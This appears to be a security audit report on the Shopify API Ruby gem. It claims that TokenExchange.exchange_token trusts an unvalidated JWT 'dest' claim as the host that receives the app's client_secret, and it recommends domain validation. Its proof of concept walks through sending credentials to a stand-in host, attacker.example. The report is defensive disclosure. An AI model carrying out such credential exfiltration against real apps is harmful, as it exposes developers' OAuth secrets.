This confirms a clear asymmetry: three of the four "exchange app credentials for a token" call sites (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) call `Utils::ShopValidator.sanitize!(shop)` on caller-supplied `shop:` strings before using them to build the host that receives `client_id`/`client_secret`. The fourth, `TokenExchange.exchange_token`, skips that call entirely and instead trusts `dest_shop = jwt_payload.shop`, but `JwtPayload#shop` only strips the `"https://"` prefix from the raw `dest` claim — it does not verify the claim is a `*.myshopify.com`/trusted Shopify domain, and it's never bound (compared) against the caller-supplied `shop:` parameter or any shop the app already knows.

### Title
Unvalidated JWT `dest` claim used as OAuth token-exchange host lets a caller-supplied domain receive the app's `client_secret` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`TokenExchange.exchange_token` derives the host it POSTs `client_id`/`client_secret` to from the session token's `dest` claim via `JwtPayload#shop`, which only strips the URL scheme and never validates the value against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. Every other credential-exchange entry point in the same file/module (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) calls `Utils::ShopValidator.sanitize!(shop)` before building the session used for the same `/admin/oauth/access_token` POST. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description
`exchange_token` calls `ShopifyAPI::Auth::JwtPayload.new(session_token)`, which does verify the JWT signature (HS256 with `Context.api_secret_key`, falling back to `old_api_secret_key`) and the `aud` claim against `Context.api_key`. [5](#0-4) 

However, `dest_shop = jwt_payload.shop` is taken straight from `@dest.gsub("https://", "")`: [6](#0-5) 

The `dest` claim itself is never checked to be a `*.myshopify.com`/trusted domain — there is no equivalent of the `iss`/`aud` equality check for `dest`. `dest_shop` is then used, unsanitized, to build `Auth::Session` and the `Clients::HttpClient` base URI: [7](#0-6) 

`Clients::HttpClient#initialize` builds `@base_uri` directly from `session.shop` when `Context.api_host` is unset, and the client POSTs the body (containing `client_id` and `client_secret`) to that host: [8](#0-7) 

The identity binding that should hold is: *the host that receives the app's `client_secret` == a host validated by `ShopValidator` against `TRUSTED_SHOPIFY_DOMAINS`*. `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token` all enforce this via `Utils::ShopValidator.sanitize!(shop)`: [9](#0-8) [10](#0-9) [11](#0-10) 

`TokenExchange.exchange_token` breaks this binding: the host is instead whatever string appears (after scheme-stripping) in the JWT's `dest` claim, with no domain allow-listing.

### Impact Explanation
If a host application can be induced to run `exchange_token` with a session token whose `dest` is not constrained to a trusted Shopify domain (e.g., a token obtained from a source other than App Bridge's `getSessionToken`, or any code path where the token is otherwise attacker-influenced before reaching this call), the app's `client_id` and `client_secret` are transmitted via HTTPS POST to whatever host is embedded in `dest`. This is SSRF carrying the app's OAuth `client_secret` to an attacker-controlled host — a High-severity credential-exfiltration primitive matching the in-scope impact category ("SSRF with the app's credentials").

### Likelihood Explanation
Likelihood depends entirely on whether `dest` can ever diverge from a legitimate Shopify-issued value while still bearing a signature the app accepts. Within this gem alone, the signature check only verifies possession of `api_secret_key`/`old_api_secret_key` and that `aud == Context.api_key` — it does not independently constrain `dest`. Since `dest` is otherwise attacker/embedder-supplied content passed through to a network call carrying secrets, and since three sibling functions in the very same module treat the analogous `shop` value as untrusted and explicitly sanitize it, the omission here is a genuine inconsistency in this gem's own code rather than a host-application misuse issue.

### Recommendation
In `JwtPayload#shop` or immediately after computing `dest_shop` in `TokenExchange.exchange_token`, validate the value with `Utils::ShopValidator.sanitize!` (as already done in `client_credentials`, `refresh_access_token`, and `migrate_to_expiring_token`) before constructing the `Auth::Session` used to build the request host, so the same trusted-domain invariant applies uniformly to every code path that transmits `client_secret`.

### Proof of Concept
1. Obtain or construct a JWT signed with the app's `api_secret_key` (as an app would receive from App Bridge / a session token provider) whose `dest` claim is set to `https://attacker.example` instead of a `*.myshopify.com` host, with `aud` set to the app's `api_key`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_or_relayed_token, requested_token_type: ...)`.
3. `JwtPayload.new` accepts the token (signature and `aud` check pass); `dest_shop` becomes `"attacker.example"`.
4. `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` sets `@base_uri = "https://attacker.example"`.
5. `client.request(...)` POSTs `{ client_id, client_secret, grant_type, subject_token, ... }` to `https://attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` to the attacker-controlled host.

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
